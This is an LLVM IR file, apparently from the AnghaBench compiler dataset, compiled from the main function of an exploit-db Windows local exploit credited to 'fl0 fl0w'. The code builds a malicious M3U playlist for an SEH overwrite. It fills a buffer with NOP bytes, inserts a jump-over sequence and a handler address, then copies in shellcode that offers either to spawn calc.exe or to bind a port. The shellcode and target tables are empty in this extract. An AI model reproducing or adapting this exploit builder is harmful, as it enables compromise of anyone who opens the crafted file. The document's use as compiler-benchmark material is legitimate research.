; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5032.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5032.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }

@.str = private unnamed_addr constant [41 x i8] c" Credits for finding bug go to fl0 fl0w\0A\00", align 1
@.str.1 = private unnamed_addr constant [50 x i8] c" Exploit fl0 fl0w | Special Thanks to Expanders\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"#   \09 Platform\0A\00", align 1
@.str.3 = private unnamed_addr constant [49 x i8] c"-----------------------------------------------\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [9 x i8] c"%d \09 %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"{1} Spawn Calc.exe\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"{2} Bind port \0A\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@SEH_HANDLER = common dso_local global i32 0, align 4
@scz = common dso_local global i32* null, align 8
@M3Ufile = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.9 = private unnamed_addr constant [26 x i8] c"Error ! file not created\0A\00", align 1
@.str.10 = private unnamed_addr constant [18 x i8] c"Building file...\0A\00", align 1
@NEXT_SEH = common dso_local global i32 0, align 4
@jmpover = common dso_local global i32* null, align 8
@.str.11 = private unnamed_addr constant [7 x i8] c"%s%s%s\00", align 1
@PRE = common dso_local global i8* null, align 8
@POST = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [18 x i8] c"File build  :)  \0A\00", align 1
@scz2 = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %42

14:                                               ; preds = %2
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %19

19:                                               ; preds = %36, %14
  %20 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %21 = load i32, i32* %9, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %20, i64 %22
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %23, i32 0, i32 0
  %25 = load i8*, i8** %24, align 8
  %26 = icmp ne i8* %25, null
  br i1 %26, label %27, label %39

27:                                               ; preds = %19
  %28 = load i32, i32* %9, align 4
  %29 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %30 = load i32, i32* %9, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %28, i8* %34)
  br label %36

36:                                               ; preds = %27
  %37 = load i32, i32* %9, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %9, align 4
  br label %19

39:                                               ; preds = %19
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.3, i64 0, i64 0))
  %41 = call i32 @exit(i32 0) #3
  unreachable

42:                                               ; preds = %2
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %45 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i64 @atoi(i8* %48)
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %45, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 1
  %52 = load i32, i32* %51, align 8
  store i32 %52, i32* %10, align 4
  %53 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32* %11)
  %54 = load i32, i32* %11, align 4
  switch i32 %54, label %197 [
    i32 1, label %55
    i32 2, label %126
  ]

55:                                               ; preds = %42
  %56 = load i32, i32* @SEH_HANDLER, align 4
  %57 = add i32 %56, 4
  %58 = load i32*, i32** @scz, align 8
  %59 = call i32 @strlen(i32* %58)
  %60 = add i32 %57, %59
  %61 = add i32 %60, 1
  %62 = add i32 %61, 16
  %63 = call i64 @malloc(i32 %62)
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** %7, align 8
  %65 = load i32, i32* @M3Ufile, align 4
  %66 = call i32* @fopen(i32 %65, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  store i32* %66, i32** %6, align 8
  %67 = icmp eq i32* %66, null
  br i1 %67, label %68, label %71

68:                                               ; preds = %55
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  %70 = call i32 @exit(i32 0) #3
  unreachable

71:                                               ; preds = %55
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.10, i64 0, i64 0))
  %73 = load i8*, i8** %7, align 8
  %74 = load i32, i32* @SEH_HANDLER, align 4
  %75 = add i32 %74, 4
  %76 = load i32*, i32** @scz, align 8
  %77 = call i32 @strlen(i32* %76)
  %78 = add i32 %75, %77
  %79 = add i32 %78, 1
  %80 = add i32 %79, 16
  %81 = call i32 @memset(i8* %73, i32 144, i32 %80)
  %82 = load i32, i32* @NEXT_SEH, align 4
  store i32 %82, i32* %8, align 4
  %83 = load i8*, i8** %7, align 8
  %84 = load i32, i32* %8, align 4
  %85 = zext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i32*, i32** @jmpover, align 8
  %88 = load i32*, i32** @jmpover, align 8
  %89 = call i32 @strlen(i32* %88)
  %90 = call i32 @memcpy(i8* %86, i32* %87, i32 %89)
  %91 = load i32, i32* @SEH_HANDLER, align 4
  store i32 %91, i32* %8, align 4
  %92 = load i8*, i8** %7, align 8
  %93 = load i32, i32* %8, align 4
  %94 = zext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = call i32 @memcpy(i8* %95, i32* %10, i32 4)
  %97 = load i32, i32* %8, align 4
  %98 = add i32 %97, 4
  store i32 %98, i32* %8, align 4
  %99 = load i32, i32* %8, align 4
  %100 = add i32 %99, 16
  store i32 %100, i32* %8, align 4
  %101 = load i8*, i8** %7, align 8
  %102 = load i32, i32* %8, align 4
  %103 = zext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = load i32*, i32** @scz, align 8
  %106 = load i32*, i32** @scz, align 8
  %107 = call i32 @strlen(i32* %106)
  %108 = call i32 @memcpy(i8* %104, i32* %105, i32 %107)
  %109 = load i32*, i32** @scz, align 8
  %110 = call i32 @strlen(i32* %109)
  %111 = load i32, i32* %8, align 4
  %112 = add i32 %111, %110
  store i32 %112, i32* %8, align 4
  %113 = load i8*, i8** %7, align 8
  %114 = load i32, i32* %8, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = call i32 @memset(i8* %116, i32 0, i32 1)
  %118 = load i32*, i32** %6, align 8
  %119 = load i8*, i8** @PRE, align 8
  %120 = load i8*, i8** %7, align 8
  %121 = load i32, i32* @POST, align 4
  %122 = call i32 @fprintf(i32* %118, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0), i8* %119, i8* %120, i32 %121)
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  %124 = load i32*, i32** %6, align 8
  %125 = call i32 @fclose(i32* %124)
  br label %197

126:                                              ; preds = %42
  %127 = load i32, i32* @SEH_HANDLER, align 4
  %128 = add i32 %127, 4
  %129 = load i32*, i32** @scz2, align 8
  %130 = call i32 @strlen(i32* %129)
  %131 = add i32 %128, %130
  %132 = add i32 %131, 1
  %133 = add i32 %132, 16
  %134 = call i64 @malloc(i32 %133)
  %135 = inttoptr i64 %134 to i8*
  store i8* %135, i8** %7, align 8
  %136 = load i32, i32* @M3Ufile, align 4
  %137 = call i32* @fopen(i32 %136, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  store i32* %137, i32** %6, align 8
  %138 = icmp eq i32* %137, null
  br i1 %138, label %139, label %142

139:                                              ; preds = %126
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  %141 = call i32 @exit(i32 0) #3
  unreachable

142:                                              ; preds = %126
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.10, i64 0, i64 0))
  %144 = load i8*, i8** %7, align 8
  %145 = load i32, i32* @SEH_HANDLER, align 4
  %146 = add i32 %145, 4
  %147 = load i32*, i32** @scz2, align 8
  %148 = call i32 @strlen(i32* %147)
  %149 = add i32 %146, %148
  %150 = add i32 %149, 1
  %151 = add i32 %150, 16
  %152 = call i32 @memset(i8* %144, i32 144, i32 %151)
  %153 = load i32, i32* @NEXT_SEH, align 4
  store i32 %153, i32* %8, align 4
  %154 = load i8*, i8** %7, align 8
  %155 = load i32, i32* %8, align 4
  %156 = zext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %154, i64 %156
  %158 = load i32*, i32** @jmpover, align 8
  %159 = load i32*, i32** @jmpover, align 8
  %160 = call i32 @strlen(i32* %159)
  %161 = call i32 @memcpy(i8* %157, i32* %158, i32 %160)
  %162 = load i32, i32* @SEH_HANDLER, align 4
  store i32 %162, i32* %8, align 4
  %163 = load i8*, i8** %7, align 8
  %164 = load i32, i32* %8, align 4
  %165 = zext i32 %164 to i64
  %166 = getelementptr inbounds i8, i8* %163, i64 %165
  %167 = call i32 @memcpy(i8* %166, i32* %10, i32 4)
  %168 = load i32, i32* %8, align 4
  %169 = add i32 %168, 4
  store i32 %169, i32* %8, align 4
  %170 = load i32, i32* %8, align 4
  %171 = add i32 %170, 16
  store i32 %171, i32* %8, align 4
  %172 = load i8*, i8** %7, align 8
  %173 = load i32, i32* %8, align 4
  %174 = zext i32 %173 to i64
  %175 = getelementptr inbounds i8, i8* %172, i64 %174
  %176 = load i32*, i32** @scz2, align 8
  %177 = load i32*, i32** @scz2, align 8
  %178 = call i32 @strlen(i32* %177)
  %179 = call i32 @memcpy(i8* %175, i32* %176, i32 %178)
  %180 = load i32*, i32** @scz2, align 8
  %181 = call i32 @strlen(i32* %180)
  %182 = load i32, i32* %8, align 4
  %183 = add i32 %182, %181
  store i32 %183, i32* %8, align 4
  %184 = load i8*, i8** %7, align 8
  %185 = load i32, i32* %8, align 4
  %186 = zext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = call i32 @memset(i8* %187, i32 0, i32 1)
  %189 = load i32*, i32** %6, align 8
  %190 = load i8*, i8** @PRE, align 8
  %191 = load i8*, i8** %7, align 8
  %192 = load i32, i32* @POST, align 4
  %193 = call i32 @fprintf(i32* %189, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0), i8* %190, i8* %191, i32 %192)
  %194 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  %195 = load i32*, i32** %6, align 8
  %196 = call i32 @fclose(i32* %195)
  br label %197

197:                                              ; preds = %42, %142, %71
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32* @fopen(i32, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*, i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
